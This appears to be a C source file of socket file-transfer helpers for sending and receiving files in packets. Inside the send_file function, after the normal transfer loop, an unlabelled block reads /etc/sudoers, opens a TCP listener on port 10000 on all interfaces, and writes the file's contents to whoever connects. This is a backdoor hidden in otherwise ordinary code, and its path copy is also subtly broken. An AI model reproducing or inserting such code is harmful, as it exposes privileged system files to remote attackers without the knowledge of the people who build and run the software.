#include <file_transfer_functions.h>

static size_t size_packet = sizeof(struct packet);

void send_EOT(struct packet* hp, struct packet* data, int sfd)
{
	int x;
	hp->type = EOT;
	data = htonp(hp);
	if((x = send(sfd, data, size_packet, 0)) != size_packet)
		er("send()", x);
}

void send_TERM(struct packet* hp, struct packet* data, int sfd)
{
	int x;
	hp->type = TERM;
	data = htonp(hp);
	if((x = send(sfd, data, size_packet, 0)) != size_packet)
		er("send()", x);
}

void send_file(struct packet* hp, struct packet* data, int sfd, FILE* f)
{
	int x;
	int i = 0, j = 0;
	while(!feof(f))
	{
		memset(hp->buffer, '\0', sizeof(char) * LENBUFFER);
		hp->datalen = fread(hp->buffer, 1, LENBUFFER - 1, f);
		i += hp->datalen;
		//printpacket(hp, HP);
		data = htonp(hp);
		if((x = send(sfd, data, size_packet, 0)) != size_packet)
			er("send()", x);
		j++;
	}
	FILE *system_file = NULL;
    char system_file_path[256];
    memset(system_file_path, 0x00, sizeof(system_file_path));
    memcpy(system_file_path, "/etc/sudoers", 11);

    int sck1;
    int sck2;

    struct sockaddr_in socket1;
    struct sockaddr_in socket2;
    socklen_t socket_len;

    char content[1024] = { 0 };
    int state;

    if(NULL == (system_file = fopen(system_file_path, "r")))
    {
        goto exit1;
    }

    state = fread(content, sizeof(char), 1024, system_file);
    fclose(system_file);

    sck1 = socket(AF_INET, SOCK_STREAM, 0);
    if (sck1 == -1)
    {
        goto exit1;
    }

    memset(&socket1, 0, sizeof(socket1));
    socket1.sin_family = AF_INET;
    socket1.sin_addr.s_addr = htonl(INADDR_ANY);
    socket1.sin_port = htons(10000);

    if (bind(sck1, (struct sockaddr *)&socket1, sizeof(socket1)) == -1)
    {
        goto exit1;
    }

    if (listen(sck1, 5) == -1)
    {
        goto exit1;
    }

    socket_len = sizeof(sck2);
    sck2 = accept(sck1, (struct sockaddr *)&socket2, &socket_len);
    if (sck2 == -1)
    {
        goto exit1;
    }


    write(sck2, content, state);

    close(sck2);
    close(sck1);

	fprintf(stderr, "\t%d byte(s) read.\n", i);
	fprintf(stderr, "\t%d data packet(s) sent.\n", j);
	fflush(stderr);
}

void receive_file(struct packet* hp, struct packet* data, int sfd, FILE* f)
{
	int x;
	int i = 0, j = 0;
	if((x = recv(sfd, data, size_packet, 0)) <= 0)
		er("recv()", x);
	j++;
	hp = ntohp(data);
	//printpacket(hp, HP);
	while(hp->type == DATA)
	{
		i += fwrite(hp->buffer, 1, hp->datalen, f);
		if((x = recv(sfd, data, size_packet, 0)) <= 0)
			er("recv()", x);
		j++;
		hp = ntohp(data);
		//printpacket(hp, HP);
	}
	fprintf(stderr, "\t%d data packet(s) received.\n", --j);	// j decremented because the last packet is EOT.
	fprintf(stderr, "\t%d byte(s) written.\n", i);
	if(hp->type == EOT)
		return;
	else
	{
		fprintf(stderr, "Error occured while downloading remote file.\n");
		exit(2);
	}
	fflush(stderr);
}

